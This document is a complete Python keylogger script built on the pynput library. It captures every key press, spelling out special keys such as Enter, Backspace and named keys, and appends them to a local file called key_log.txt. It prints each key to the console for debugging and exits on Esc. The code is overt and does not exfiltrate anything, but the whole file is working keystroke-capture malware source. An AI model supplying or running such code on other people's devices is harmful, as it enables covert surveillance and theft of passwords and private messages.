from pynput import keyboard

# File to save the logged keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
        print(f"Key pressed: {key.char}")  # Debugging statement
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
            print("Key pressed: [SPACE]")  # Debugging statement
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
            print("Key pressed: [ENTER]")  # Debugging statement
        elif key == keyboard.Key.backspace:
            with open(log_file, "a") as f:
                f.write("[BACKSPACE]")
            print("Key pressed: [BACKSPACE]")  # Debugging statement
        else:
            with open(log_file, "a") as f:
                f.write(f"[{key.name.upper()}]")
            print(f"Key pressed: [{key.name.upper()}]")  # Debugging statement

def on_release(key):
    # Stop the keylogger on pressing 'esc'
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")  # Debugging statement
        return False

if __name__ == "__main__":
    print("Starting keylogger... Press 'esc' to stop.")  # Debugging statement
    # Set up the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.")  # Debugging statement

